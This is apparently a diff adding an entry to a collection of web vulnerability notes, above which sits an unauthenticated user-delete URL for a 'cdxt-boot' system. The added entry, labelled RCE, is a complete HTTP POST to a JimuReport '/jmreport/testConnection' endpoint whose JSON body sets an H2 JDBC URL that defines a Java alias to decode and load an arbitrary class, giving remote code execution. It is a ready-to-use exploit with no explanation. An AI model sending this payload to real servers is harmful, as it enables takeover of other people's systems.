@@ -114,3 +114,29 @@ Content-Length: 97
 ```
 /cdxt-boot/sys/user/delete?id=1833706241834209281&orgId=LIS20170328006643931
 ```
+
+
+
+^
+RCE
+```
+POST /jmreport/testConnection HTTP/1.1
+Host: x.x.x.x
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+Connection: close
+Content-Length: 8881
+Accept-Encoding: gzip
+Cmd: echo "2ZTvHsq4au3uOQ2mK9OuJb86rdO"
+Content-Type: application/json
+
+{
+  "id": "1",
+  "code": "ABC",
+  "dbType": "MySQL",
+  "dbDriver": "org.h2.Driver",
+  "dbUrl": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes; try {bytes=java.util.Base64.getDecoder().decode(b);} catch (Exception e) {e.printStackTrace(); bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b);} java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0], java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0, bytes.length); clz.newInstance();}';",
+  "dbName": "383BAb7deFC825E6",
+  "dbPassword": "2ZTvHsq4au3uOQ2mK9OuJb86rdO",
+  "userName": "2ZTvHsq4au3uOQ2mK9OuJb86rdO"
+}
+```
